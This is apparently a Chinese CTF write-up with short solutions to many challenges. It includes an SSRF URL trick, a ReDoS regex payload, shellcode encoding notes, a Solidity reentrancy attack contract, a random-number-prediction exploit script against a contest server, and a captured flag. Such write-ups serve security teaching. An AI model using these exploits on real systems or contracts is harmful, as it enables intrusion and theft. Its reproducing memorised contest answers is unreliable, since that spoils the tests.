## 签到题

略

## 白与夜

把背景变黑

## 信息安全 2077

f12 copy as curl 改一下时间

## 宇宙终极问题

### 42

google

### Everything

平方的版本可以通过 [wiki](https://en.wikipedia.org/wiki/Lagrange%27s_four-square_theorem) 找到论文，实现一个就行。立方的我考虑用几个 $(an+b)^3$ 去凑到只剩一次和常数项，枚举一下 $a,b$ 可以得到大量可用的方案，但是这个并非对所有 $n$ 都有效，需要多次尝试。

### Last question

多次尝试，直到是 $4k+1$ 的质数。

## 网页读取器

http://web1/flag?@example.com

## 达拉崩吧大冒险

审查元素，买的数量改成 -1844674407370955171

## Happy LUG

查看该域名的 txt 记录

## 正则验证器

`(a+)+$`

`aaaaaaaaaaaaaaaaaaaaaaab`

## 不同寻常的 Python 考试

```python
'Hello'
(0,0,[],[])
'1'
([1],1)
[3,2,1]
({1,2},{2,3})
(2,[1],[2])
(-1,-1,[1])
(1,-1)
('abc','')
['12']
('','2')
({1},{1})
([1, '1'],'1')
('33','33')
(233,b'\xe9')
(1,{0:1})
(1e400,1e400)
'᱙᮴௯៩'
[0, False, 0.0, -0.0, 0j, (-0-0j), -0j, ((-0.0)-(0.0j))]
```

查看 python docs，发现 `ast.literal_eval` 只允许少量类型。fuzz 一下这些类型的表现可以通过绝大多数题目。

## 小巧玲珑的 ELF

ida 打开，发现是个简单加密，倒着搞一下就行。

## Shell 骇客

### 1

pwntools 生成一个就行。

### 2

msfvenom 处理一下 pwntools 的输出。

### 3

https://github.com/ecx86/shellcode_encoder 但是他好像有点问题，改了下面一句（加了 2）

```python
offset_of_jump = len(payload) + len_set_rdi + len_write4 + 2 * len_set_rdi + 2
```

## 三教奇妙夜

ffmpeg 提关键帧，找像素值之和较低的图，发现少了一帧。把最后若干秒也提出来，发现了那一帧。

## 小 U 的加密

猜测是异或加密，看到大量 0x39，猜测原来是 0，异或上 0x39 得到一个 midi 文件，打开发现画出了 flag。

## 献给最好的你

反编译发现输入的串 base64 之后交换了大小写，然后和指定串比较。还原得到合法的输入，输进去得到 flag。

## 驴啃计算器

要求的数较大，假设最后一步是 R2D，然后 bfs 即可。

```python
from math import *

s={}

s['sin']=sin
s['cos']=cos
s['tan']=tan
s['exp']=exp
s['asin']=asin
s['acos']=acos
s['atan']=atan
s['log']=log
s['sinh']=sinh
s['cosh']=cosh
s['tanh']=tanh
s['x^2']=lambda x:x^2
s['asinh']=asinh
s['acosh']=acosh
s['atanh']=atanh
s['sqrt']=sqrt
s['D2R']=lambda x:x*pi/180
s['R2D']=lambda x:x*180/pi
s['-x']=lambda x:-x
s['1/x']=lambda x:1/x

def cal(a,b):
	try:
		return s[a](b)
	except:
		return None

req=20.15280418426918
req=cal('D2R',req)
EPS=cal('D2R',1e-5)

fa={}
q=[]
q.append(0)
fa[0]=-1

def path(x):
	re=[]
	while type(fa[x]) is not int:
		re.append(fa[x][1])
		x=q[fa[x][0]]
	return list(reversed(re))

i=0
while i<len(q):
	x=q[i]
	for j in s:
		t=cal(j,x)
		if t is not None:
			if t not in fa:
				q.append(t)
				fa[t]=(i,j)
				if abs(t-req)<EPS:
					print(','.join(path(t)+['R2D']))
	i+=1
```

## 天书残篇

whitespace 代码。找到一个 ide： https://vii5ard.github.io/whitespace/ 。单步跟一下发现也是个逐位简单加密，然后还原一下就行（忘了具体是啥了）。

## 我想要个家

chroot，脚本自动写时间，ln，把 sleep 和对应 lib 复制进去。

## 十次方根

中国剩余定理，然后就是质数和质数的幂的情况，这两个丢进 mathematica 就能求出解。

## 被泄漏的姜戈

本地的 django 改一下判断密码的逻辑，获得 cookie 之后在题目环境使用即可。

## 无限猴子定理

单词中相邻两个都是辅音字母的可能性很小。按这种情况出现次数排序，找到一个词 `Generat0r`。输出所有包含它的串，得到 flag。

## PowerShell 迷宫

虽然没有提供 nc，但是可以把 websocket 简单封装一下提供类似的环境。

剩下就是随便怎么搞都行了。不过服务器会发送完整路径，所以可以限制一下路径长度。

```python
import sys
from websocket import create_connection

rbuf=''
_ot=True

def _recv():
	global ws,rbuf
	if len(rbuf)==0:
		rbuf=ws.recv().replace('\r\n','\n')
	if _ot:
		sys.stderr.write(rbuf[0])
		sys.stderr.flush()
	r=rbuf[0]
	rbuf=rbuf[1:]
	return r

def recv(x):
	res=''
	while True:
		res+=_recv()
		if x in res:return res

def send(x):
	global ws
	ws.send(x)

ws = create_connection("ws://202.38.93.241:10023/shell")
recv('token: ')
send('team token\n')
recv('Learn more about powershell at https://docs.microsoft.com/en-us/powershell.')

d={'Down':(0,1),'Up':(0,-1),'Left':(-1,0),'Right':(1,0)}

def rsp(x):
	while True:
		y=x.replace('  ',' ')
		if x==y:return y
		x=y

def get():
	recv('PS Maze')
	recv('> ')
	send('ls\n')
	recv('Direction')
	recv('---------')
	recv('\n')
	s=[]
	while True:
		t=recv('\n')
		if len(t)<3:
			break
		t=rsp(t.strip()).split(' ')
		t[1]=int(t[1])
		t[2]=int(t[2])
		s.append(t[0])
		cur=t[1]-d[t[0]][0],t[2]-d[t[0]][1]
		if len(t)>3:
			print('found flag')
			print(cur)
			print(t)
			exit()
	return cur,s

def find_unknown(p,seq):
	q=[p]
	sq={p:seq}
	i=0
	while i<len(q):
		t=q[i]
		st=sq[t]
		x1=[]
		x2=[]
		for j in known[t]:
			if len(st) and d[j][0]+d[st[-1]][0]==0 and d[j][1]+d[st[-1]][1]==0:
				x1.append(j)
			else:
				x2.append(j)
		for xd in x1+x2:
			xt=st[:-1] if xd in x1 else st+[xd]
			xp=(t[0]+d[xd][0],t[1]+d[xd][1])
			if xp not in known:
				u=min(len(xt),len(seq))
				while xt[:u]!=seq[:u]:
					u-=1
				return xp,['..']*(len(seq)-u)+xt[u:]
			if xp not in sq:
				q.append(xp)
				sq[xp]=xt
		i+=1
	return None

cur=(0,0)
curv=[]
known={(0,0):'Down'}

_ot=False

while True:
	if len(curv)>300:
		for i in range(140):
			send('cd ..\n')
			curv=curv[:-1]
		cur=get()[0]
	ncur,s=find_unknown(cur,curv)
	print(ncur,len(curv),s)
	for i in s:
		if i=='..':
			curv=curv[:-1]
		else:
			curv+=[i]
		send('cd '+i+'\n')
	a,b=get()
	known[a]=b
	assert a==ncur
	cur=ncur
```

（为了防止超时可以存一下已知的位置，这份代码把这个删掉了）

## 韭菜银行

### flag1

查看创建合约时的参数

### flag2

重入漏洞

```solidity
contract attacker {
    JCBank target = JCBank(0xe575c9abd35fa94f1949f7d559056bb66fddeb51);

    uint private flag = 0;

    function exploit() public payable {
        target.deposit.value(1000 wei)();
        target.withdraw(1000 wei);
        target.get_flag_2(460743966538);
    }

    function() external payable {
        if (flag == 0) {
            flag = 1;
            target.withdraw(1000 wei);
        }
    }
}
```

## 没有 BUG 的教务系统

main 函数里存着加密后的 flag，虽然加密过程比较长，但是因为是逐位的，所以可以爆破。

（另外这个密码拿到第二问用需要输入 `\0` 再换行，这一点有点毒瘤。。）

## 失落的圣物

虽然用到了 kvm，但是对应代码块可以直接通过 ida 反编译。然后简单还原一下就行。

## 大整数分解锦标赛

查看 scipy 源码，发现用了 python 自带的 random。由于 H 指令可以产生大量随机质数，考虑预测随机数。

google 找到  https://github.com/tna0y/Python-random-module-cracker 。但是这里不能直接用，因为并不是生成的 32 位随机数，并且一部分位被改变了。

考虑 Mersenne Twister 的本质，如果我们有足够长的序列，那么 `a[i],a[i+1],a[i+397],a[i+624]` 是满足某个规律的。这题里某些值的某些位不确定，但是如果上面四元组里不确定的位足够少，那么就可以爆破。

主程序是 python 写的，爆破用了 C++ 写，不过不知哪里写挂了还是随机数返回的结果比较奇怪，这个需要多试几次才能得到解。

```python
import socket,time,sys,os
from randcrack import RandCrack
import sympy

op_=False

def _recv(x):
	global rt,op_
	r=rt.recv(x)
	if op_:
		sys.stderr.write(r.decode())
		sys.stderr.flush()
	return r.decode()

def recv(x):
	res=''
	while True:
		res+=_recv(1)
		if x in res:return res

def send(x):
	global rt
	rt.send(x.encode())

def fetch():
	recv('[E]xit? ')
	send('H\n')
	recv('p = ')
	p=int(recv('\n'))
	recv('q = ')
	q=int(recv('\n'))
	return p,q

rt=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rt.connect(('202.38.93.241',10010))
recv('token: ')
send('team token\n')

def recover(s,n):
	c = (n + 31) // 32
	re=[]
	for i in range(c):
		re.append((s>>(i*32)) % (2**32))
	re[-1]<<=c*32-n
	wr=[0 for i in range(c)]
	wr[-1]=(1<<c*32-n)-1
	return re,wr

def extend(x):
	t=0
	while (1<<t)<x:
		t+=1
	return (1<<t)-1

def conn(a,b):
	return (a[0]+b[0],a[1]+b[1])

def work():
	p,q=fetch()
	print('work:',p,q)
	px=sympy.prevprime(p)
	qx=sympy.prevprime(q)
	bits=max(10,max(p.bit_length(),q.bit_length()))
	rbits=recover(bits-10,10)
	rp=recover(p-2,bits)
	rq=recover(q-2,bits)
	rp[1][0]=extend((px-2)^(p-2))
	rq[1][0]=extend((qx-2)^(q-2))
	t=min((1<<10)-1,extend((bits-10)^(bits+22)))
	rbits[1][0]|=t<<22
	return conn(conn(rbits,rp),rq)

s=([],[])
while len(s[0])<624*3:
	s=conn(s,work())

uu=str(len(s[0]))+'\n'+' '.join(map(str,s[0]))+'\n'+' '.join(map(str,s[1]))
open('fa.txt','w').write(uu)
os.system('a')
ss=list(map(int,open('fao.txt','r').read().split(' ')[:-1]))
sst=ss[0]
ss=ss[1:]
rr=RandCrack()
for i in ss:
	rr.submit(i)
for i in range(len(s[0])-624*(sst+1)):
	rr.predict_randrange(0,2**32-1)

def predict_generate(bits):
	p = rr.predict_randrange(2, 2 ** bits)
	q = rr.predict_randrange(2, 2 ** bits)
	p = sympy.nextprime(p)
	q = sympy.nextprime(q)
	return p, q, p * q

def get_task():
	recv('n = ')
	return int(recv('\n'))

send('B\n')

for i in range(10,1024,32):
	a=get_task()
	b=predict_generate(i)
	print(a,b)
	send(str(b[0])+'\n')
	send(str(b[1])+'\n')
op_=True
recv('gugugu')

# flag: flag{Did_y0u_rea11y_fact0r_them??I_can^t_believe_4e5230537c}
```

```cpp
#include<bits/stdc++.h>

typedef unsigned int uint;
typedef long long ll;
typedef unsigned long long ull;
typedef double lf;
typedef long double llf;
typedef std::pair<int,int> pii;

#define xx first
#define yy second

template<typename T> inline T max(T a,T b){return a>b?a:b;}
template<typename T> inline T min(T a,T b){return a<b?a:b;}
template<typename T> inline T abs(T a){return a>0?a:-a;}
template<typename T> inline bool repr(T &a,T b){return a<b?a=b,1:0;}
template<typename T> inline bool repl(T &a,T b){return a>b?a=b,1:0;}
template<typename T> inline T gcd(T a,T b){T t;if(a<b){while(a){t=a;a=b%a;b=t;}return b;}else{while(b){t=b;b=a%b;a=t;}return a;}}
template<typename T> inline T sqr(T x){return x*x;}
#define mp(a,b) std::make_pair(a,b)
#define pb push_back
#define I __attribute__((always_inline))inline
#define mset(a,b) memset(a,b,sizeof(a))
#define mcpy(a,b) memcpy(a,b,sizeof(a))

#define fo0(i,n) for(ull i=0,i##end=n;i<i##end;i++)
#define fo1(i,n) for(int i=1,i##end=n;i<=i##end;i++)
#define fo(i,a,b) for(int i=a,i##end=b;i<=i##end;i++)
#define fd0(i,n) for(int i=(n)-1;~i;i--)
#define fd1(i,n) for(int i=n;i;i--)
#define fd(i,a,b) for(int i=a,i##end=b;i>=i##end;i--)
#define foe(i,x)for(__typeof((x).end())i=(x).begin();i!=(x).end();++i)
#define fre(i,x)for(__typeof((x).rend())i=(x).rbegin();i!=(x).rend();++i)

struct Cg{I char operator()(){return getchar();}};
struct Cp{I void operator()(char x){putchar(x);}};
#define OP operator
#define RT return *this;
#define UC unsigned char
#define RX x=0;UC t=P();while((t<'0'||t>'9')&&t!='-')t=P();bool f=0;\
if(t=='-')t=P(),f=1;x=t-'0';for(t=P();t>='0'&&t<='9';t=P())x=x*10+t-'0'
#define RL if(t=='.'){lf u=0.1;for(t=P();t>='0'&&t<='9';t=P(),u*=0.1)x+=u*(t-'0');}if(f)x=-x
#define RU x=0;UC t=P();while(t<'0'||t>'9')t=P();x=t-'0';for(t=P();t>='0'&&t<='9';t=P())x=x*10+t-'0'
#define TR *this,x;return x;
I bool IS(char x){return x==10||x==13||x==' ';}template<typename T>struct Fr{T P;I Fr&OP,(int&x)
{RX;if(f)x=-x;RT}I OP int(){int x;TR}I Fr&OP,(ll &x){RX;if(f)x=-x;RT}I OP ll(){ll x;TR}I Fr&OP,(char&x)
{for(x=P();IS(x);x=P());RT}I OP char(){char x;TR}I Fr&OP,(char*x){char t=P();for(;IS(t);t=P());if(~t){for(;!IS
(t)&&~t;t=P())*x++=t;}*x++=0;RT}I Fr&OP,(lf&x){RX;RL;RT}I OP lf(){lf x;TR}I Fr&OP,(llf&x){RX;RL;RT}I OP llf()
{llf x;TR}I Fr&OP,(uint&x){RU;RT}I OP uint(){uint x;TR}I Fr&OP,(ull&x){RU;RT}I OP ull(){ull x;TR}};Fr<Cg>in;
#define WI(S) if(x){if(x<0)P('-'),x=-x;UC s[S],c=0;while(x)s[c++]=x%10+'0',x/=10;while(c--)P(s[c]);}else P('0')
#define WL if(y){lf t=0.5;for(int i=y;i--;)t*=0.1;if(x>=0)x+=t;else x-=t,P('-');*this,(ll)(abs(x));P('.');if(x<0)\
x=-x;while(y--){x*=10;x-=floor(x*0.1)*10;P(((int)x)%10+'0');}}else if(x>=0)*this,(ll)(x+0.5);else *this,(ll)(x-0.5);
#define WU(S) if(x){UC s[S],c=0;while(x)s[c++]=x%10+'0',x/=10;while(c--)P(s[c]);}else P('0')
template<typename T>struct Fw{T P;I Fw&OP,(int x){WI(10);RT}I Fw&OP()(int x){WI(10);RT}I Fw&OP,(uint x){WU(10);RT}
I Fw&OP()(uint x){WU(10);RT}I Fw&OP,(ll x){WI(19);RT}I Fw&OP()(ll x){WI(19);RT}I Fw&OP,(ull x){WU(20);RT}I Fw&OP()
(ull x){WU(20);RT}I Fw&OP,(char x){P(x);RT}I Fw&OP()(char x){P(x);RT}I Fw&OP,(const char*x){while(*x)P(*x++);RT}
I Fw&OP()(const char*x){while(*x)P(*x++);RT}I Fw&OP()(lf x,int y){WL;RT}I Fw&OP()(llf x,int y){WL;RT}};Fw<Cp>out;

typedef std::pair<uint,uint>puu;

uint dhm(uint enc,uint ad,uint shift)
{
	uint old=enc;
	fo0(i,(32+shift-1)/shift)
	{
		old=((old<<shift)&ad)^enc;
	}
	return old;
}

uint har(uint x)
{
	x^=x>>11;
	x^=(x<<7)&0x9d2c5680;
	x^=(x<<15)&0xefc60000;
	x^=x>>18;
	return x;
}

uint rhar(uint x)
{
	x^=x>>18;
	x=dhm(x,0xefc60000,15);
	x=dhm(x,0x9d2c5680,7);
	x^=x>>21<<10;
	x^=x<<11>>22;
	return x;
}

uint n,a[5000],b[5000];
puu s[5000];

const uint mag01[2] = {0, 0x9908b0df};
const uint L = 0x7fffffff;
const uint U = 0x80000000;
const int N = 624, M = 397;

void solve(puu x,puu x1,puu xm,puu xu,int ri,int LIM)
{
	if(!(x.yy|x1.yy|xm.yy|xu.yy))
	{
		uint y=(rhar(x.xx)&U)|(rhar(x1.xx)&L);
		assert(xu.xx==har(rhar(xm.xx)^y>>1^mag01[y&1]));
		return;
	}
	int px=__builtin_popcount(x.yy);
	int px1=__builtin_popcount(x1.yy);
	int pxm=__builtin_popcount(xm.yy);
	int pxu=__builtin_popcount(xu.yy);
	if(px+px1+pxm<=LIM)
	{
		if(px+px1+pxm>20)fprintf(stderr,"try: %d %d %d %d %d\n",ri,px,px1,pxm,pxu);
		int okc=0,bei=-1;
		assert(x.yy+1ll==(1ll<<px));
		assert(x1.yy+1ll==(1ll<<px1));
		assert(xm.yy+1ll==(1ll<<pxm));
		assert(xu.yy+1ll==(1ll<<pxu));
		int rx,rx1,rxm,rxu;
		if(px1==0&&pxm==0)
		{
			uint vx1=rhar(x1.xx)&L;
			uint vxm=rhar(xm.xx);
			fo0(i,1ll<<px)
			{
				uint y=(rhar(x.xx^i)&U)|vx1;
				uint rs=vxm^(y>>1)^mag01[y&1];
				uint ku=har(rs)^xu.xx;
				if(ku<(1ll<<pxu))
				{
					okc++;
					if(okc>1)return;
					rx=x.xx^i,rx1=x1.xx,rxm=xm.xx,rxu=xu.xx^ku;
				}
			}
		}
		else if(px==0&&pxm==0)
		{
			uint vx=rhar(x.xx)&U;
			uint vxm=rhar(xm.xx);
			fo0(i,1ll<<px1)
			{
				uint y=vx|(rhar(x1.xx^i)&L);
				uint rs=vxm^(y>>1)^mag01[y&1];
				uint ku=har(rs)^xu.xx;
				if(ku<(1ll<<pxu))
				{
					okc++;
					if(okc>1)return;
					rx=x.xx,rx1=x1.xx^i,rxm=xm.xx,rxu=xu.xx^ku;
				}
			}
		}
		else if(px==0&&px1==0)
		{
			uint vx=rhar(x.xx)&U;
			uint vx1=rhar(x1.xx)&L;
			fo0(i,1ll<<pxm)
			{
				uint y=vx|vx1;
				uint rs=rhar(xm.xx^i)^(y>>1)^mag01[y&1];
				uint ku=har(rs)^xu.xx;
				if(ku<(1ll<<pxu))
				{
					okc++;
					if(okc>1)return;
					rx=x.xx,rx1=x1.xx,rxm=xm.xx^i,rxu=xu.xx^ku;
				}
			}
		}
		else
		{
			std::vector<uint>vx,vx1,vxm;
			fo0(i,1ll<<px)vx.pb(rhar(x.xx^i)&U);
			fo0(i,1ll<<px1)vx1.pb(rhar(x1.xx^i)&L);
			fo0(i,1ll<<pxm)vxm.pb(rhar(xm.xx^i));
			fo0(i,1ll<<px)fo0(j,1ll<<px1)fo0(k,1ll<<pxm)
			{
				uint y=vx[i]|vx1[j];
				uint rs=vxm[k]^(y>>1)^mag01[y&1];
				uint ku=har(rs)^xu.xx;
				if(ku<(1ll<<pxu))
				{
					okc++;
					if(okc>1)return;
					rx=x.xx^i,rx1=x1.xx^j,rxm=xm.xx^k,rxu=xu.xx^ku;
				}
			}
		}
		if(px+px1+pxm>20)fprintf(stderr,"%d\n",okc);
		if(okc==1)
		{
			s[ri]=mp(rx,0);
			s[ri+1]=mp(rx1,0);
			s[ri+M]=mp(rxm,0);
			s[ri+N]=mp(rxu,0);
		}
	}
}

int main()
{
	freopen("fa.txt","r",stdin);
	in,n;
	fo0(i,n)in,a[i];
	fo0(i,n)in,b[i];
	b[373]=~0u;
	fo0(i,n)s[i]=mp(a[i],b[i]);
	for(int T=1;;T++)
	{
		fo0(i,N*2)
		{
			solve(s[i],s[i+1],s[i+M],s[i+N],i,min(32,T));
		}
		int c0=0,c1=0,c2=0;
		fo0(i,N)if(!s[i].yy)c0++;
		fo0(i,N)if(!s[i+N].yy)c1++;
		fo0(i,N)if(!s[i+N*2].yy)c2++;
		out,c0,' ',c1,' ',c2,'\n';
		if(c1==624)
		{
			freopen("fao.txt","w",stdout);
			out,1,' ';
			fo0(i,N)out,s[i+N].xx,' ';out,'\n';
			return 0;
		}
		if(c2==624)
		{
			freopen("fao.txt","w",stdout);
			out,2,' ';
			fo0(i,N)out,s[i+N*2].xx,' ';out,'\n';
			return 0;
		}
	}
}

```

## Flag 红包

如果没有自环，把所有没有出边的节点和出边全是必胜的节点标为必败，出边存在必败的节点标为必胜。如果当前节点必胜那么策略显然。否则走到任意不确定节点即可。

对于自环，显然只有当前节点必败时才会走，如果自环个数是奇数则把当前节点改成必胜。
